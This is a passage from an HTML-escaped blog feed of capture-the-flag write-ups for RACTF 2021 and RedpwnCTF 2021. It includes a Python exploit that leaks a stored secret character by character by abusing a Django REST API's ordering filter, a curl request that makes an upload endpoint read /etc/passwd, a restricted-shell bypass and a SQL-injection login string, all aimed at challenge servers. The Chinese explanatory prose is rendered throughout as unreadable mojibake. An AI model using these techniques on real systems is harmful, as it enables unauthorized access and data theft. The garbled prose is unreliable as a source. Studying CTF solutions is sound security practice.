&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCDecrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hextext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagBytes&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Flag: %s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{int3rEst1ng_M4sk_paTt3rn}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://ctf.rip/write-ups/crypto/ractf-2021-military-grade/">wp&lt;/a>&lt;/p>
&lt;h2 id="websecret-store">Web/Secret Store&lt;/h2>
&lt;blockquote>
&lt;p>How many secrets could a secret store store if a store could store secrets?&lt;/p>
&lt;/blockquote>
&lt;p>Ê≥®ÂÜåÂíåÁôªÂΩï‰πãÂêéÂèØ‰ª•ÈÄöËøáapiËÆæÁΩÆ‰∏Ä‰∏™Ëá™Â∑±ÁöÑsecretÔºåËÆæÁΩÆÂ•Ω‰πãÂêéËøòÂèØ‰ª•Êõ¥Êîπ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818040636796.png" alt="image-20210818040636796">&lt;/p>
&lt;p>ÁªôÂá∫‰∫ÜÊ∫êÁ†ÅÔºåÊòØdjangoÊ°ÜÊû∂ÔºåÁî®Âà∞‰∫Ürest_frameworkÔºåÈ°µÈù¢ÁöÑdebugÊ®°ÂºèËøòÂºÄÁùÄÔºåÊúâ‰∏Ä‰∏™Âêç‰∏∫secretÁöÑapp&lt;/p>
&lt;p>models.pyËßÑÂÆö‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑÂ≠òÂÇ®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133525714.png" alt="image-20210818133525714">&lt;/p>
&lt;p>ËøòÊúâ‰∏™ÈÖçÂ•óÁöÑmodel serializerÔºåËßÑÂÆö‰∫ÜÂè™ËØªÂíåÂè™ÂÜôÁöÑ‰∏çÂêåÂÜÖÂÆπ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133658766.png" alt="image-20210818133658766">&lt;/p>
&lt;p>ÁÑ∂ÂêéÊòØviews.pyÔºåÂΩìÁ°ÆËÆ§userÁôªÂΩïÁä∂ÊÄÅ‰πãÂêéÔºåÂ¶ÇÊûúËÆæÁΩÆËøásecretÂ∞Ü‰ºöÂ±ïÁ§∫Âá∫Êù•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818134115205.png" alt="image-20210818134115205">&lt;/p>
&lt;p>Áõ¥Êé•Áî®GetÊñπÂºèËØ∑Ê±Ç&lt;code>/api/secret/?format=json&lt;/code>ÂèØ‰ª•ÂæóÂà∞ÊâÄÊúâËÆæÁΩÆËøáÁöÑsecretÔºåÁêÜÊâÄÂΩìÁÑ∂ÁöÑÁåúÊµãid=1,owner=1ÁöÑvalue=flagÔºå‰ΩÜÊòØvalueÂ≠óÊÆµÊòØÂè™ÂÜôËÄåÈùûÂè™ËØªÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818151539994.png" alt="image-20210818151539994">&lt;/p>
&lt;p>Áî±‰∫éÁî®ÁöÑÊòØdjangoÁöÑrest frameworkÔºåÂèØ‰ª•Âà©Áî®ÂÆÉÁöÑ&lt;a href="https://www.django-rest-framework.org/api-guide/filtering/#orderingfilter">Ordering Filter&lt;/a>ÂäüËÉΩÊù•ÂØπËøô‰∫õjsonÂÜÖÂÆπÊ†πÊçÆvalueÊù•ËøõË°å‰∏Ä‰∏™ÊéíÂ∫è&lt;code>/api/secret/?ordering=value&amp;amp;format=json&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818152408227.png" alt="image-20210818152408227">&lt;/p>
&lt;p>ÈááÁî®char-by-charÁöÑÁõ≤Ê≥®ÊñπÂºèÔºå‰∏çÊñ≠Âú∞ÈáçÂ§çËÆæÁΩÆsecret-&amp;gt;‰ª•valueÊéíÂ∫è-&amp;gt;Â¶ÇÊûú‰Ωç‰∫éid=1,owner=1ÁöÑÂâçÈù¢ÔºåÂπ∂‰∏î‰∏ã‰∏ÄÊ¨°Â∞±‰Ωç‰∫éÂÆÉÁöÑÂêéÈù¢ÔºåËØ¥ÊòéËøôÊòØÊ≠£Á°ÆÁöÑÂ≠óÁ¨¶-&amp;gt;‰øÆÊîπsecretÔºåÁªßÁª≠ÁàÜÁ†¥‰∏ã‰∏Ä‰∏™Â≠óÁ¨¶&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;span style="color:#111">csrf_token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu&amp;#34;&lt;/span>
&lt;span style="color:#111">session_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq&amp;#34;&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Cookie&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;csrftoken=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">csrf_token&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; sessionid=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">session_id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;X-CSRFToken&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">csrf_token&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">our_secret_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curr_flag&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">curr_flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">json_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">json_payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(r.status_code)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/?ordering=value&amp;amp;format=json&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secrets&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">secrets&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">our_secret_id&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">found_real_char&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">next_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">next_char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] Curr Flag:&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{data_exf1l_via_s0rt1ng_0c66de47}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://github.com/glikogataki/RACTF-Some-Challs/tree/main/secret_store">wp1&lt;/a> &lt;a href="https://medium.com/@Nicholaz99/ractf-2021-writeup-647554511dc5">wp2&lt;/a>&lt;/p>
&lt;h2 id="webim-a-fun">Web/I&amp;rsquo;m a fun&lt;/h2>
&lt;blockquote>
&lt;p>Agent,&lt;/p>
&lt;p>Do you remember the firearms store case from last year? The one they were using as a secret communication platform?&lt;/p>
&lt;p>Well, we&amp;rsquo;ve located the servers for them, the issue is they&amp;rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we&amp;rsquo;ll need to gain shell access to their systems the good old way. They&amp;rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they&amp;rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.&lt;/p>
&lt;p>We&amp;rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?&lt;/p>
&lt;/blockquote>
&lt;p>Âú®/upload/contentÂ§ÑÂèØ‰ª•‰∏ä‰º†videoÔºåÁâπÂà´ÁöÑÊòØ‰∏ä‰º†Â§ÑÊúâ‰∏™&lt;code>external&lt;/code>&lt;/p>
&lt;p>Áî®curlÊñπÂºèËØ∑Ê±Ç‰∏Ä‰∏ã/etc/passwdÔºå&lt;code>curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818163712187.png" alt="image-20210818163712187">&lt;/p>
&lt;p>‰πãÂêéÂ∞ùËØïËØªÊ∫êÁ†ÅÔºàÊàëÊ≤°ÁàÜÂá∫Êù•ÁõÆÂΩïÔºâÔºå‰πãÂêéÁöÑÁúãwp‰∫ÜÔºåÊàëÂ§™Ëèú&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818170117432.png" alt="image-20210818170117432">&lt;/p>
&lt;p>&lt;code>ractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://github.com/TheBadGod/ractf2021/blob/main/im_a_fan.md">wp&lt;/a>&lt;/p>
&lt;h2 id="osinttriangles">OSINT/Triangles&lt;/h2>
&lt;p>&lt;a href="https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW">https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815120938702.png" alt="image-20210815120938702">&lt;/p>
&lt;h2 id="miscellaneousdiscord">Miscellaneous/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Come join our &lt;a href="https://discord.gg/Rrhdvzn">Discord&lt;/a>!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>ractf{so_here_we_are_again}&lt;/code>&lt;/p>
&lt;h2 id="miscellaneousmissing-tools">Miscellaneous/Missing Tools&lt;/h2>
&lt;blockquote>
&lt;p>Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?&lt;/p>
&lt;p>Username: &lt;code>ractf&lt;/code>&lt;/p>
&lt;p>Password: &lt;code>8POlNixzDSThy&lt;/code>&lt;/p>
&lt;p>Note: it may take a minute or more for your container to start depending on load&lt;/p>
&lt;/blockquote>
&lt;p>Ê†πÊçÆÁªôÂá∫ÁöÑ‰ø°ÊÅØsshËøûÂÖ•‰∏Ä‰∏™ÁªàÁ´ØÔºåÂèØ‰ª•ÂèëÁé∞ÂæàÂ§öÁöÑÂëΩ‰ª§ÈÉΩË¢´Á¶ÅÊ≠¢‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025059013.png" alt="image-20210818025059013">&lt;/p>
&lt;p>‰ΩøÁî®&lt;code>echo /usr/bin/* /bin/*&lt;/code>ÂèØ‰ª•Êü•ÁúãËÉΩ‰ΩøÁî®ÁöÑÂëΩ‰ª§ËøòÊúâÂì™‰∫õ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025158619.png" alt="image-20210818025158619">&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂÖàËØ¥‰∏Ä‰∏ãÁÆÄÂçïÁöÑÈùûÈ¢ÑÊúüËß£Ôºö&lt;code>echo *&lt;/code>ÊâæÂà∞flag.txtÔºåÁÑ∂Âêé&lt;code>source flag.txt&lt;/code>ÊàñËÄÖ&lt;code>sh &amp;lt; flag.txt&lt;/code>ÈÉΩËÉΩËØªÂá∫Êù•&lt;/p>
&lt;p>ËÄåÈ¢ÑÊúüËß£‰ΩøÁî®ÁöÑÊòØ&lt;u>split+re-sha256&lt;/u>ÁöÑÊñπÂºè„ÄÇÁõ¥Êé•Áî®sha256sumÂæóÂà∞flagÁÑ∂ÂêéÊÉ≥Âº∫Ë°åÊö¥ÂäõÁ†¥Ëß£ÊòæÁÑ∂ÈùûÂ∏∏ÁöÑ‰∏çÁé∞ÂÆûÔºå‰ΩÜÊòØsplitËøô‰∏™Â∑•ÂÖ∑ÂèØ‰ª•‰ª•Âõ∫ÂÆöÁöÑÂ≠óËäÇÊï∞Êù•ÂàíÂàÜÁªôÂÆöÁöÑÊñá‰ª∂ÔºåÂ¶ÇÊûúÊàë‰ª¨‰ª•ÂæàÂ∞èÁöÑÊ†áÂ∞∫Êù•ÂàíÂàÜflagÂπ∂ËøõË°åsha256ÔºåÈÇ£‰πàËøôÊ†∑ÂæóÂà∞ÁöÑhashÂÄºÂ∞±Â∞ÜÈùûÂ∏∏ÊúâÂèØËÉΩÁàÜÁ†¥Âá∫Êù•ÔºåÊúÄÂêéÂÜçÊääÂÆÉ‰ª¨ÂêàËµ∑Êù•Â∞±ËÉΩÂæóÂà∞ÊúÄÁªàÁöÑflag‰∫ÜÔºàËøôÈáåÁî®3bytesÂàíÂàÜÔºâ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b &lt;span style="color:#ae81ff">3&lt;/span> flag.txt
$ &lt;span style="color:#111">echo&lt;/span> *
flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal
$ sha256sum xa*
df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa
582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab
a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac
569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad
7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae
618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf
f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag
f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah
de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai
a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj
56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak
df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030044169.png" alt="image-20210818030044169">&lt;/p>
&lt;p>Âà∞&lt;a href="https://crackstation.net/">CrackStation&lt;/a>‰∏ÄÊääÊ¢≠&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030225147.png" alt="image-20210818030225147">&lt;/p>
&lt;p>&lt;code>ractf{std0ut_1s_0v3rr4ted_spl1t_sha}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>ÂÆ≥ÔºåÂâçÂá†Â§©Áä∂ÊÄÅËé´ÂêçÂæàÂ∑ÆÔºå‰πãÂâçÊä•ÁöÑÂá†‰∏™Âë®Êú´ÁöÑctfÁîöËá≥ËøûÁ≠æÂà∞ÈÉΩÊ≤°Á≠æÔºåÂ§çÁé∞‰πüÊòØ‰∏ÄÊãñÂÜçÊãñÔºåÊãñÂà∞ÁéØÂ¢ÉÈÉΩÂÖ≥ÂÆå‰∫ÜÔºåÊå∫ÂêéÊÇîÁöÑÔºåÊòØËá™Â∑±ÁöÑÈóÆÈ¢ò„ÄÇ&lt;/p>
&lt;p>Âú®ÂèçÊÄùÂíåË∞ÉÊï¥‰∫ÜÔºåÂóØ„ÄÇ&lt;/p></description></item><item><title>RedpwnCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</link><pubDate>Sun, 08 Aug 2021 20:08:39 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/</guid><description>&lt;p>ÂÆòÊñπÁöÑdockerÂú∞ÂùÄ~~Â§çÁé∞‰∏ÄÊú¨Êª°Ë∂≥~&lt;a href="https://github.com/redpwn/redpwnctf-2021-challenges">https://github.com/redpwn/redpwnctf-2021-challenges&lt;/a>&lt;/p>
&lt;h2 id="webinspect-me">web/inspect-me&lt;/h2>
&lt;blockquote>
&lt;p>See if you can find the flag in the source code!&lt;/p>
&lt;p>&lt;a href="https://inspect-me.mc.ax/">inspect-me.mc.ax&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092212510.png" alt="image-20210710092212510">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092254315.png" alt="image-20210710092254315">&lt;/p>
&lt;h2 id="weborm-bad">web/orm-bad&lt;/h2>
&lt;blockquote>
&lt;p>I just learned about orms today! They seem kinda difficult to implement though&amp;hellip; Guess I&amp;rsquo;ll stick to good old raw sql statements!&lt;/p>
&lt;p>&lt;a href="https://orm-bad.mc.ax/">orm-bad.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/eb4c66c15fe3013340068ef0a34bd5dd5c0c98c567fac53b158d56afe07b511c/app.js">app.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>‰∏áËÉΩÂØÜÁ†ÅÔºöadmin&amp;rsquo;or'1 : admin&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710092643161.png" alt="image-20210710092643161">&lt;/p>
&lt;p>ÂÖ≥‰∫éorm ‰πãÂêéË¶ÅË°•‰∏Ä‰∏ãÁü•ËØÜÔºö&lt;a href="https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping">Object‚Äìrelational mapping&lt;/a> &lt;a href="http://www.ruanyifeng.com/blog/2019/02/orm-tutorial.html">ORM ÂÆû‰æãÊïôÁ®ã&lt;/a>&lt;/p>
&lt;h2 id="websecure">web/secure&lt;/h2>
&lt;blockquote>
&lt;p>Just learned about encryption‚Äînow, my website is unhackable!&lt;/p>
&lt;p>&lt;a href="https://secure.mc.ax/">secure.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/210a9fe526e420576e4b6c1cb74eeed437c1a89955c8158c14aa365c45578200/index.js">index.js&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ËøòÊòØ‰∏™ÁôªÂΩïÊ°ÜÔºåÂ∞ùËØï‰∏áËÉΩÂØÜÁ†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094442324.png" alt="image-20210710094442324">&lt;/p>
&lt;p>Ê∫êÁ†ÅÊòØËøôÊ†∑ÁöÑ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;crypto&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
